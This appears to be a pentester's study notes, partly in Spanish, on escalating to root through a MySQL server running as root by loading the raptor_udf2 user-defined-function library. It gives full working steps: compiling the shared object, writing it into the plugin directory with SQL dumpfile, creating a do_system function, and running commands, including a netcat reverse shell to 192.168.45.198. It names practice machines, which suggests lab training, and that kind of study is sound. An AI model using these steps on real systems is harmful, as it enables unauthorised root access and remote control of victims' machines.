
## DESCRIPTION
This is an helper dynamic library for local privilege escalation through
 MySQL run with root privileges (very bad idea!), slightly modified to work 
 with newer versions of the open-source database. Tested on MySQL 4.1.14.
 
 See also: http://www.0xdeadbeef.info/exploits/raptor_udf.c
 
 Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes
 for the security vulnerabilities in the handling of User Defined Functions
 (UDFs) reported by Stefano Di Paola <stefano.dipaola@wisec.it>. For further
 details, please refer to:

NECESITAMOS ESTAR AUTENTICADOS Y QUE ROOT EJECUTE MYSQL

![[Pasted image 20230615192257.png]]

#### Mas información
* https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf
* LA MEJOR: https://juggernaut-sec.com/mysql-user-defined-functions/


## EXPLOITATION

1. Descargamos el exploit 
![[Pasted image 20230615192408.png]]

**!!NOTA IMPORTANTE!!**  le cambiamos el nombre al siguiente, si no dará problemas mas adelante:

```
cp 1518.c raptor_udf2.c
```

2. En la maquina victima lo compilamos

```
**gcc -g -c raptor_udf2.c  #compile the exploit code****gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc        #create the shared library (so)**
```


3. Nos autenticamos

```
mysql -u root -p

show variables like '%plugin%'; #Localizamos el path de los plugins
```

![[Pasted image 20230615192620.png]]

4. Comprobamos si la variable **_secure_file_priv_** is enabled

```
show variables like '%secure_file_priv%';
```

![[Pasted image 20230615192721.png]]

5. Nos cambiamos ala bbdd

```
use mysql;
```

6. Creamos la tabla

```
create table foo(line blob);
insert into foo values(load_file('/var/www/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

7. Confirmamos que la funcion se ha creado correctamente

```
**select * from mysql.func;**
```

8. Podemos ejecutar comandos

```
select do_system('id > /var/www/output; chown www-data www-data /var/www/output');

# REverse shell

select do_system('nc -e /bin/bash 192.168.45.198 21');
```

![[Pasted image 20230615192953.png]]
## MACHINES

* Hack The Box: 
* PG: banzai

**!!NOTA IMPORTANTE!!** 